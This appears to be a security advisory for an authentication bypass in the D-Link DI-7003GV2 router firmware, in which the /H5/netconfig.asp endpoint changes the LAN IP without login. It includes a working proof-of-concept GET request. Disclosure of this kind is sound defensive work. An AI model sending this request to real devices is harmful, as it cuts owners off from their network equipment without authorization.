# Overview

- Manufacturer's website information：https://www.dlink.com/
- Firmware download address ：http://www.dlink.com.cn/techsupport/download.ashx?file=7828

# Affected version

DI-7003GV2-24.04.18D1 R(68125)

# Vulnerability description

The D-Link DI-7003GV2 firmware version 24.04.18D1 R(68125) has an authentication bypass vulnerability in the `/H5/netconfig.asp` interface. Remote attackers can modify the device’s LAN IP address without authentication, potentially causing loss of access or network disruption.

# Vulnerability details


The processing function for the `H5/netconfig.asp` interface is `sub_497DE4`.

![图 0](img/cf1fe13d149cee3604936dcafe3b2ee1f712210029de8aba8cac16da38920316.png)  

The `sub_497DE4` function retrieves the user-input lan_ipaddr, checks if the IP is valid, and then sets it as the lan IP address.

![图 1](img/2fc68472198ffc1f697bde1de5a22a4c5b604b0ed8042e0d57ac39c9585b6376.png)  


# POC

The device login address is 192.168.140.240.

![图 2](img/35eb2f70b81c0bf8f3191a7731ab66a7e5abc7a49780d879774d84016ed7f28d.png)  

Sending the POC data packet does not receive a response, but our login address has actually been modified.

```http
GET /H5/netconfig.asp?lan_ipaddr=192.168.1.99 HTTP/1.1
Host: 192.168.140.240
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Connection: close
Cache-Control: max-age=0
```

![图 3](img/c038fcc1b5aad243e0d0b51028aa89b70af0bfbcd91b814b91dd68e420ce7726.png)  

The original IP address can no longer be accessed, and the page has been transferred to a new IP address.

![图 4](img/2cf24f2a423402e8ed4d9ce244311b9c699c1bd1b0ab7165576db7e8ac28c7af.png)  

![图 5](img/b1ff8638a3d22837d067fc183cc0178b8b9f73a2249786e76877be9940345798.png)  
